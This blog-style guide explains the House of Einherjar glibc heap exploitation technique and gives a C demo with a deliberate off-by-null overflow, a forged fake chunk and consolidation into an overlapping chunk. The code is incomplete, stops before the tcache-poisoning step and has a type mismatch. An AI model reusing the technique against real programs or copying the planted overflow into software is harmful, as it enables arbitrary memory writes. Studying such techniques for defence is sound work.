---
layout: post
title: house-of-einherjar
description:
date: 2026-01-30
categories:
  - Guide
  - heap-exploitation
tags:
  - heap-exploitation
---


This technique forces `malloc` to return a chunk from any address (arbitrary write/read primitive). It uses a off-by-one vulnerability to modify the `prev_size` of the next heap block, and unset the `prev_inuse` bit.

`null-byte-overwrite -> consolidation -> overlapped chunk -> tcache/fastbin poisonging.`

Steps 

1. Allocate 3 chunks (a,b, & c).
2. Prepare fake chunk in `a`
3. modify the `prev_size` of c and use off-by-null to overwrite `prev_inuse` flag of c.
	1. set prev size to point to the fake chunk that is in a
4. Fill in the tcache bins
5. Free c to trigger consolidation.
	1. This is cause consolidation among c, b and fake chunk. (happens because of `prev_size`)
	2. This will result in a free chunk of size (a + b + fake_chunk) in the unsorted bin.
6. Allocate a new chunk (d)
7. used `d` to write a `fd/next` field and apply `tcache poisoning`



```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <stdint.h>

int main(void) {
	char stack_var[0x40] = "HELLO WORLD!";
	// allocate chunks and prepare fake chunk
	intptr_t t1 = NULL;
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			t1 = (intptr_t*)&stack_var[i];
			break;
		}
	}
	intptr_t *a = malloc(0x38);
	a[0] = 0;
	a[1] = 0x60;
	a[2] = (size_t)a;
	a[3] = (size_t)a;

	uint8_t *b = (uint8_t*) malloc(0x28);
	uint8_t *c = (uint8_t*)malloc(0xf8);
	
	// off by one vuln
	b[0x28]=0; // vulnerability
	
	size_t fake_size = (size_t)(c - 0x10 - (uint8_t*)a);
	//printf("Fake Size: 0x%lx\n", fake_size);
	*(size_t*)&b[0x28 - sizeof(size_t)] = fake_size;

	// fill in tcache
	char* x[7];
	for (int i =0; i < 7; i++) x[i] = malloc(0xf8);

	for (int i = 0; i < 7; i++) free(x[i]);

	// free c to cause consolidation
	free(c);
	
	char *d = (char*)malloc(0x158);
	// returns a overlapping chunk
```
